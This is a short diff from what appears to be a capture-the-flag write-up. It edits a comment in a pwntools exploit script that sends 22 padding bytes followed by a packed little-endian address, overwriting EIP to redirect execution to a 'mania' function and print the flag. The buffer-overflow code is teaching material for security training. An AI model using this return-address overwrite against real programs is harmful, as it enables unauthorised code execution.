@@ -64,7 +64,7 @@ print target                              #debug print
 
 target = p32(target, endian='little')     #convert the integer into a 32 bit architecture little endian address
 print target                              #debug print, should print utf-8 encoded hex (often has unprintables)
-r.sendline('a'*22+target)                 #send the exploit on over!
+r.sendline('a'*22+target)                 #send the exploit on over! 22 As are used to fill up the offset, and the target address fills the eip, setting the return pointer to be mania
 print r.recv()                            #print the first line, had no flag so:
 print r.recv()                            #print next line (flag)
 ```
